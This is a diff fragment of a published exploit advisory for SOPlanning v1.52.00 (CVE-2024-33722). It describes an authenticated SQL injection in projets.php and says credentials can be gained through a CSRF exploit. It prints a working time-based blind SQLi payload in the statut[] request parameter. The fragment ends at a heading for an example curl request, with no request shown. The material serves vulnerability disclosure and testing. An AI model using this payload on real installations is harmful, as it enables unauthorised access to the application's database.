@@ -32,18 +32,31 @@ Analysis: The landing page takes into consideration the user input parameter the
 
 
 Exploit Title: SOPlanning v1.52.00 'projets.php' SQLi
+
 Application: SOPlanning
+
 Version: 1.52.00
+
 Date: 4/22/24
+
 Exploit Author: Joseph McPeters (Liquidsky aka fuzzlove)
+
 Vendor Homepage: https://www.soplanning.org/en/
+
 Software Link: https://sourceforge.net/projects/soplanning/
+
 Tested on: Linux
+
 CVE: CVE-2024-33722
+
 Description: SOPlanning v1.52.00 is vulnerable to Authenticated SQL Injection via the 'projects.php' page.
+
 Instructions: Authenticate to the host, the credentials can be obtained using a CSRF exploit (more info included). Once valid credentials are obtained use either a GET/POST request to send the valid parameters that equal to valid SQLi.
+
 Vulnerable request parameters for request to "/www/projets.php":
+
 filtreGroupeProjet=1&statut[]=todo'+AND+(SELECT+8073+FROM+(SELECT(SLEEP(10)))PuxA)+AND+'Liquidsky'='Liquidsky&rechercheProjet=test
+
 The above parameters can be sent as either a valid GET/POST request to trigger the SQLi.
 Example Curl Request To Re-Test SQLi:
 
